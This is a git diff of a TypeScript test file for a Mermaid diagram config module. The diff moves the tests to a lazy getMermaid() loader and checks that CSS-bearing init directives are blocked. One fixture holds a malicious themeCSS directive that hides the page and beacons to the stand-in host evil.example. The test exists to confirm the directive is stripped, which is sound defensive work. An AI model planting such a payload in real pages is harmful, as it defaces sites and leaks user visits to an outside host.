@@ -1,10 +1,11 @@
 import { describe, expect, it, vi, beforeEach } from "vitest";
-import mermaid, {
+import {
   normalizeMermaidChart,
   cleanupErrorCache,
   errorCache,
   mermaidCache,
 } from "./mermaidConfig";
+import { getMermaid } from "./mermaidRenderManager";
 
 // Mock console.warn
 global.console = {
@@ -254,7 +255,6 @@ describe("mermaidConfig", () => {
 
     it("handles multiple cleanup calls", () => {
       const now = Date.now();
-      const fiveMinutes = 5 * 60 * 1000;
 
       errorCache.set("chart1", { count: 1, lastSeen: now - 1000 });
       cleanupErrorCache();
@@ -319,12 +319,13 @@ describe("mermaidConfig", () => {
     // mermaid 11.15's `%%{init:{"themeCSS":"..."}}%%` directive splices raw,
     // unscoped CSS into the rendered <style> block (bypassing the
     // #<svgId>-namespacing every other diagram style rule goes through) and
-    // isn't covered by mermaid's default `secure` list. mermaidConfig.ts's
-    // module-level `mermaid.initialize()` call adds it (+ themeVariables,
+    // isn't covered by mermaid's default `secure` list. The lazy `getMermaid()`
+    // loader runs a base `mermaid.initialize()` that adds it (+ themeVariables,
     // fontFamily) to `secure`, so mermaid itself deletes those keys from any
     // per-diagram directive before it's merged into the render config —
     // regardless of what sanitizeSvg.ts does downstream.
-    it("locks themeCSS, themeVariables and fontFamily via mermaid's secure config", () => {
+    it("locks themeCSS, themeVariables and fontFamily via mermaid's secure config", async () => {
+      const mermaid = await getMermaid();
       const secure = mermaid.mermaidAPI.getConfig().secure ?? [];
       expect(secure).toContain("themeCSS");
       expect(secure).toContain("themeVariables");
@@ -332,6 +333,7 @@ describe("mermaidConfig", () => {
     });
 
     it("strips a malicious %%{init}%% themeCSS directive before it reaches the render config", async () => {
+      const mermaid = await getMermaid();
       const chart = [
         '%%{init: {"themeCSS": "body{display:none} [data-exfil]{background:url(https://evil.example/beacon)}"}}%%',
         "flowchart TD",
@@ -344,6 +346,7 @@ describe("mermaidConfig", () => {
     });
 
     it("still allows non-CSS-bearing %%{init}%% directive keys through", async () => {
+      const mermaid = await getMermaid();
       const chart = [
         '%%{init: {"flowchart": {"curve": "linear"}}}%%',
         "flowchart TD",
